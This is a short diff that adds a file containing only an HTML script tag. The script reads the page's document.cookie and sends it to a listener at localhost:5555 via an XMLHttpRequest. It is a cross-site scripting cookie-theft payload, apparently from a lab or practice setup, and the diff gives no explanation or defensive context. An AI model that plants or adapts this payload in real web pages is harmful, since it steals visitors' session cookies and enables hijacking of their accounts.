@@ -1,0 +1,5 @@
+<script>
+    var xhr = new XMLHttpRequest();
+    xhr.open("GET", "http://localhost:5555/" + encodeURIComponent(document.cookie));
+    xhr.send();
+</script>
